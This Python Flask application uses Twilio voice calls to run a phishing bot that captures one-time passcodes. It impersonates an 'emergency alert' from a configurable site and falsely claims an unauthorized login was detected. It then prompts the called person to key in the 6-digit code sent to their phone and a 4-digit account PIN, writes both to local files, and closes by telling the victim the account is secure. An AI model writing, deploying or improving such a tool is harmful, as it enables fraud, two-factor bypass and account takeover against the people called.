from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather, Play, Redirect
import os
from twilio.rest import Client

app = Flask(__name__)

site = open('site.txt', 'r').read()
name = open('name.txt', 'r').read()

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    # Start a TwiML response
    resp = VoiceResponse()
    resp.say(f"Hello, This is an emergency alert from {site},.")
    gather = Gather(num_digits=1, action='/gather', timeout=120)
    gather.say(f"if this is, {name} , please press 1, otherwise., please hang up'")
    resp.append(gather)
    return str(resp)

@app.route('/gather', methods=['GET', 'POST'])
def gather():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    if 'Digits' in request.values:
        # Get which digit the caller chose
        choice = request.values['Digits']

        # <Say> a different message depending on the caller's choice
        if choice == '1':
            gatherotp = Gather(num_digits='6', action='/writeotp', timeout=120)
            gatherotp.say(f'An unauthorized login has been detected on your {site} account. if this was not you. to secure your {site} account., please input the., 6 digit ,. one time pass code we have sent to your mobile phone,.')
            resp.append(gatherotp)

    # If the user didn't choose 1 or 2 (or anything), send them back to /voice
    resp.redirect('/gather')

    return str(resp)


@app.route('/writeotp', methods=['GET', 'POST'])
def writeotp():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()
    resp.say('')
    if 'Digits' in request.values:
        # Get which digit the caller chose
        a = open('otp.txt', 'w', encoding='utf-8')
        choice1 = request.values['Digits']
        a.write(choice1)
        resp.redirect('/gatherpin')
        return str(resp)
        

@app.route('/gatherpin', methods=['GET', 'POST'])
def gatherpin():
    """Processes results from the <Gather> prompt in /gatherotp"""
    # Start TwiML response
    resp = VoiceResponse()
    resp.say(f'For confirmation,. please input your,. 4 digit,. {site} pin number now.')
    gatherpin = Gather(num_digits='4', action='/writepin', timeout=120)
    resp.append(gatherpin)
    return str(resp)
    

@app.route('/writepin', methods=['GET', 'POST'])
def writepin():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    resp.say(f'Thank you, Your {site} Account is now secure, Good bye.')
    if 'Digits' in request.values:
        # Get which digit the caller chose
        a = open('pin.txt', 'w', encoding='utf-8')
        choice1 = request.values['Digits']
        a.write(choice1)
        return str(resp)


if __name__ == "__main__":
    app.run(debug=True)